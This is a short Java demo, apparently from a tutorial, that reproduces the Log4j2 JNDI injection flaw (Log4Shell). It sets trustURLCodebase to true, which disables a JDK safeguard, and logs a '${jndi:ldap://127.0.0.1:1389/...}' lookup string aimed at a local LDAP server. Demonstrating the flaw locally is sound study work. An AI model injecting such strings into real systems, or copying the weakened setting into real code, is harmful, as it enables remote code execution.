import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author www.wdbyte.com
 */
public class Log4j2 {
    private static final Logger logger = LogManager.getLogger(Log4j2.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}","${jndi:ldap://127.0.0.1:1389/Log4jTest}");
    }
}
